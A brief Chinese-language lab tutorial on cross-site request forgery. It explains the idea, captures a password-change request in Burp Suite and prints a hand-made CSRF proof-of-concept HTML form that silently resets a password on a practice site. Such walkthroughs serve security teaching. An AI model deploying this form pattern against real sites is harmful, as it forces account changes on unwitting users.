# CSRF攻击

[CSRF攻击参考链接](https://www.cnblogs.com/liuhuan086/p/14752017.html)

跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：**简单的身份验证只能保证请求是发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的**。



## 示例

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823222326.png)

登录之后，打开burpsuite并抓包，点击修改密码查看抓包的内容。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823225636.png)

然后使用burpsuite来构造PoC，emmm，需要专业版才能使用`构造CSRF PoC`的功能。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823224231.png)

那就通过其他方式手动生成PoC吧。

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://www.webtester.com/csrf/csrf01.php?c=update" method="POST">
      <input type="hidden" name="password" value="a123456" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

将上面的内容保存成`.html`文件，然后通过浏览器打开，查看页面只有一个`Submit request`按钮。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823230424.png)

点击按钮再查看结果，发现提示修改成功。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210823230752.png)

